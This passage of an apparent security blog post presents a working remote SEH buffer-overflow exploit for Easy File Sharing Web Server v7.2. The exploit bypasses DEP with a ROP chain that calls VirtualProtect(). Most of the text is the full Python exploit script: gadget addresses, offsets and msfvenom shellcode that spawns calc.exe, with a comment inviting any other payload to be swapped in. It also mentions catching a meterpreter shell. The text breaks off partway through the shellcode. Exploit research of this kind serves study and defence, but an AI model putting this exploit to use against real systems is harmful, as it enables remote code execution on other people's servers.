</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">rop_offset</span>                       <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">seh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>                                <span class="c"># overwrite nSEH pointer</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x1002280a</span><span class="p">)</span>         <span class="c"># overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">)</span>         <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>        <span class="c"># padding</span>
</span></code></pre></td></tr></table></div></figure>


<p>If everything went fine, we should get the meterpreter shell. Set the listener up and run the exploit.</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/meterpreter.png" alt="meterpreter PNG" /></p>

<p>Whoop-whoop! Obligatory victory-dance (cc: <a href="https://twitter.com/TheColonial">OJ</a>) :)</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/shell_dance.gif" alt="shell_dance GIF" /></p>

<h2>Summary</h2>

<p>The final exploit with a simple PoC shellcode spawning a calculator is shown below.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># Exploit title: Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP bypass with ROP)</span>
</span><span class='line'><span class="c"># Date: 29/11/2015</span>
</span><span class='line'><span class="c"># Exploit Author: Knaps</span>
</span><span class='line'><span class="c"># Contact: @TheKnapsy</span>
</span><span class='line'><span class="c"># Website: http://blog.knapsy.com</span>
</span><span class='line'><span class="c"># Software Link: http://www.sharing-file.com/efssetup.exe</span>
</span><span class='line'><span class="c"># Version: Easy File Sharing Web Server v7.2</span>
</span><span class='line'><span class="c"># Tested on: Windows 7 x64, but should work on any other Windows platform</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># Notes:</span>
</span><span class='line'><span class="c"># - based on non-DEP SEH buffer overflow exploit by Audit0r (https://www.exploit-db.com/exploits/38526/)</span>
</span><span class='line'><span class="c"># - created for fun &amp; practice, also because it&#39;s not 1998 anymore - gotta bypass that DEP! :)</span>
</span><span class='line'><span class="c"># - bad chars: &#39;\x00&#39; and &#39;\x3b&#39;</span>
</span><span class='line'><span class="c"># - max shellcode size allowed: 1260 bytes</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ROP chain generated with mona.py - www.corelan.be (and slightly fixed by @TheKnapsy)</span>
</span><span class='line'><span class="c"># Essentially, use PUSHAD to set all parameters and call VirtualProtect() to disable DEP.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="c"># Generate value of 201 in EAX</span>
</span><span class='line'>    <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>    <span class="mh">0xFFFFFDFF</span><span class="p">,</span>  <span class="c"># Value of &#39;-201&#39;</span>
</span><span class='line'>    <span class="mh">0x100231d1</span><span class="p">,</span>  <span class="c"># NEG EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)</span>
</span><span class='line'>    <span class="mh">0x1001da09</span><span class="p">,</span>  <span class="c"># ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Carry on with the ROP as generated by mona.py</span>
</span><span class='line'>    <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c832d0</span><span class="p">,</span>  <span class="c"># ptr to &amp;VirtualProtect() [IAT sqlite3.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location</span>
</span><span class='line'>    <span class="c"># used solely by the remaining part of the above gadget (it doesn&#39;t really do anything for us)</span>
</span><span class='line'>    <span class="mh">0x1001281a</span><span class="p">,</span>  <span class="c"># ADD ESP,4 # RETN [ImageLoad.dll]</span>
</span><span class='line'>    <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># And carry on further as generated by mona.py</span>
</span><span class='line'>    <span class="mh">0x1002248c</span><span class="p">,</span>  <span class="c"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c18d81</span><span class="p">,</span>  <span class="c"># XCHG EAX,EDI # RETN [sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x1001d626</span><span class="p">,</span>  <span class="c"># XOR ESI,ESI # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x10021a3e</span><span class="p">,</span>  <span class="c"># ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x10013ad6</span><span class="p">,</span>  <span class="c"># POP EBP # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c227fa</span><span class="p">,</span>  <span class="c"># &amp; push esp # ret  [sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x10022c4c</span><span class="p">,</span>  <span class="c"># XOR EDX,EDX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  
</span><span class='line'>    <span class="c"># Now bunch of ugly increments... unfortunately couldn&#39;t find anything nicer :(</span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>      <span class="mh">0x1001b4f6</span><span class="p">,</span>  <span class="c"># POP ECX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>      <span class="mh">0x100194b3</span><span class="p">,</span>  <span class="c"># POP EDI # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x1001a858</span><span class="p">,</span>  <span class="c"># RETN (ROP NOP) [ImageLoad.dll]</span>
</span><span class='line'>      <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>      <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c"># nop</span>
</span><span class='line'>      <span class="mh">0x100240c2</span><span class="p">,</span>  <span class="c"># PUSHAD # RETN [ImageLoad.dll] </span>
</span><span class='line'>    <span class="p">]</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  
</span><span class='line'><span class="c"># Check command line args </span>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Usage: python poc.py [host] [port]&quot;</span>
</span><span class='line'>    <span class="nb">exit</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># Offsets</span>
</span><span class='line'><span class="n">rop_offset</span> <span class="o">=</span> <span class="mi">2455</span>
</span><span class='line'><span class="n">max_size</span> <span class="o">=</span> <span class="mi">5000</span>
</span><span class='line'><span class="n">seh_offset</span> <span class="o">=</span> <span class="mi">4059</span>
</span><span class='line'><span class="n">eax_offset</span> <span class="o">=</span> <span class="mi">4183</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># move ESP out of the way so the shellcode doesn&#39;t corrupt itself during execution</span>
</span><span class='line'><span class="c"># metasm &gt; add esp,-1500</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span>  <span class="s">&quot;</span><span class="se">\x81\xc4\x24\xfa\xff\xff</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Just as a PoC, spawn calc.exe. Replace with any other shellcode you want</span>
</span><span class='line'><span class="c"># (maximum size of shellcode allowed: 1260 bytes)</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># msfvenom -p windows/exec CMD=calc.exe -b &#39;\x00\x3b&#39; -f python</span>
</span><span class='line'><span class="c"># Payload size: 220 bytes</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xbb\xde\x37\x73\xe9\xdb\xdf\xd9\x74\x24\xf4\x58\x31</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc9\xb1\x31\x31\x58\x13\x83\xe8\xfc\x03\x58\xd1\xd5</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x86\x15\x05\x9b\x69\xe6\xd5\xfc\xe0\x03\xe4\x3c\x96</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x40\x56\x8d\xdc\x05\x5a\x66\xb0\xbd\xe9\x0a\x1d\xb1</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x5a\xa0\x7b\xfc\x5b\x99\xb8\x9f\xdf\xe0\xec\x7f\xde</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x2a\xe1\x7e\x27\x56\x08\xd2\xf0\x1c\xbf\xc3\x75\x68</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x7c\x6f\xc5\x7c\x04\x8c\x9d\x7f\x25\x03\x96\xd9\xe5</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xa5\x7b\x52\xac\xbd\x98\x5f\x66\x35\x6a\x2b\x79\x9f</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xa3\xd4\xd6\xde\x0c\x27\x26\x26\xaa\xd8\x5d\x5e\xc9</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x65\x66\xa5\xb0\xb1\xe3\x3e\x12\x31\x53\x9b\xa3\x96</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x02\x68\xaf\x53\x40\x36\xb3\x62\x85\x4c\xcf\xef\x28</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x83\x46\xab\x0e\x07\x03\x6f\x2e\x1e\xe9\xde\x4f\x40</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x52\xbe\xf5\x0a\x7e\xab\x87\x50\x14\x2a\x15\xef\x5a</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x2c\x25\xf0\xca\x45\x14\x7b\x85\x12\xa9\xae\xe2\xed</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xe3\xf3\x42\x66\xaa\x61\xd7\xeb\x4d\x5c\x1b\x12\xce</span><span class="s">&quot;</span>
